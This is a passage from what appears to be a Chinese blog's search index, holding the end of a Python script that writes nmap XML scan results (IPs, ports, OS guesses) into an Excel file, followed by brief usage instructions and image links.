class="comment">#初始化excel</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">excelcsh</span>():</span></span><br><span class="line">ExcelFile = xlwt.Workbook(encoding=<span class="string">&#x27;utf-8&#x27;</span>,style_compression=<span class="number">0</span>)</span><br><span class="line">sheet1 = ExcelFile.add_sheet(<span class="string">&#x27;nmap结果&#x27;</span>)</span><br><span class="line"><span class="comment">#表格第一行</span></span><br><span class="line">sheet1.write(<span class="number">0</span>,<span class="number">0</span>,<span class="string">&#x27;ip地址&#x27;</span>)</span><br><span class="line">sheet1.write(<span class="number">0</span>,<span class="number">1</span>,<span class="string">&#x27;TCP端口&#x27;</span>)</span><br><span class="line">sheet1.write(<span class="number">0</span>,<span class="number">2</span>,<span class="string">&#x27;其他协议端口&#x27;</span>)</span><br><span class="line">sheet1.write(<span class="number">0</span>,<span class="number">3</span>,<span class="string">&#x27;系统版本&#x27;</span>)</span><br><span class="line">sheet1.write(<span class="number">0</span>,<span class="number">4</span>,<span class="string">&#x27;系统扫描精准度&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> ExcelFile,sheet1</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">output</span>(<span class="params">sheet,ip,tcpport,otherproto,num,osversion,accuracy</span>):</span></span><br><span class="line"><span class="comment">#写入数据</span></span><br><span class="line">sheet.write(num,<span class="number">0</span>,ip)</span><br><span class="line">sheet.write(num,<span class="number">1</span>,tcpport)</span><br><span class="line">sheet.write(num,<span class="number">2</span>,otherproto)</span><br><span class="line">sheet.write(num,<span class="number">3</span>,osversion)</span><br><span class="line">sheet.write(num,<span class="number">4</span>,accuracy)</span><br><span class="line"><span class="comment">#刷新缓存</span></span><br><span class="line">sheet.flush_row_data()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&quot;xml解析&quot;</span>)<span class="comment">#.decode(&#x27;utf-8&#x27;).encode(&#x27;gbk&#x27;)</span></span><br><span class="line">parser.add_argument(<span class="string">&#x27;-x&#x27;</span>,action=<span class="string">&quot;store&quot;</span>,required=<span class="literal">False</span>,dest=<span class="string">&quot;xml&quot;</span>,<span class="built_in">type</span>=<span class="built_in">str</span>,<span class="built_in">help</span>=<span class="string">&#x27;nmap result(xml file)&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-o&#x27;</span>,action=<span class="string">&quot;store&quot;</span>,required=<span class="literal">False</span>,dest=<span class="string">&quot;outfile&quot;</span>,<span class="built_in">type</span>=<span class="built_in">str</span>,<span class="built_in">help</span>=<span class="string">&#x27;outputName&#x27;</span>,default=<span class="string">&quot;excel.xls&quot;</span>)</span><br><span class="line"><span class="comment"># parser.add_argument(&#x27;--file&#x27;,action=&quot;store&quot;,required=False,dest=&quot;file&quot;,type=str,help=&#x27;Input filename eg:a.txt&#x27;)</span></span><br><span class="line">args = parser.parse_args()</span><br><span class="line">xml = args.xml</span><br><span class="line">outpath = args.outfile</span><br><span class="line"><span class="keyword">if</span> xml:</span><br><span class="line">excelfile,sheet = excelcsh()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">parsexml(xml,sheet)</span><br><span class="line"><span class="keyword">except</span> FileExistsError <span class="keyword">as</span> e:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;xml文件不存在&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line">excelfile.save(outpath)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;文件保存至 %s&quot;</span> % outpath)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Error args&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;eg: python3 pythonXml.py -x nmap.xml -o nmap.xls&#x27;</span>)</span><br></pre></td></tr></table></figure><h5 id="3-怎么用"><a href="#3-怎么用" class="headerlink" title="3. 怎么用"></a>3. 怎么用</h5><p>因为每个人的习惯都不同，写的鬼东西自己感觉方便，别人看来可能都运行不起来，所以简单说明一下<br>a. 需要安装xlwt库，命令行中运行: pip install xlwt<br>b. 需要用python3.x运行，python2的兄弟可以把 print() 改成 print ，同时把开头效验版本的if语句注释掉<br>c. python3 nmapxml2excel -x test.xml -o test.xls</p><h3 id="四、补充"><a href="#四、补充" class="headerlink" title="四、补充"></a>四、补充</h3><ol><li><p>nmap扫描端口和服务</p><p><img src="/img/Nmap%E7%BB%93%E6%9E%9C%E8%BF%87%E6%BB%A4/2.png" alt="2"></p></li><li><p>脚本过滤</p><p><img src="/img/Nmap%E7%BB%93%E6%9E%9C%E8%BF%87%E6%BB%A4/3.png" alt="3"></p></li><li><p>excel内容</p><p><img src="/img/Nmap%E7%BB%93%E6%9E%9C%E8%BF%87%E6%BB%A4/4.png" alt="4"></p></li><li><p>批量结果处理</p><p><img src="/img/Nmap%E7%BB%93%E6%9E%9C%E8%BF%87%E6%BB%A4/5.png" alt="5"></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 脚本 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> py脚本 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
